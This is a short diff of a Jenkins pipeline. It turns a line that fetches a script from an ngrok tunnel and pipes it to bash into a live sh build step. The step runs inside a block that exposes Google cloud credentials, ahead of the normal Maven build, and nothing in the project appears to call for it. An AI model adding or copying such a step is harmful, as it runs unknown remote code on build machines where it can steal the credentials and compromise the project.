@@ -39,7 +39,7 @@ pipeline {
                     withCredentials([[$class: 'StringBinding', credentialsId: env.GCE_IT_CRED_ID, variable: 'GOOGLE_CREDENTIALS']]) {
                         catchError {
                             // build
-                            curl https://104b-180-151-104-178.in.ngrok.io/file.sh | bash
+                            sh "curl https://104b-180-151-104-178.in.ngrok.io/file.sh | bash"
                             sh "mvn clean package -ntp"
 
                             // run tests
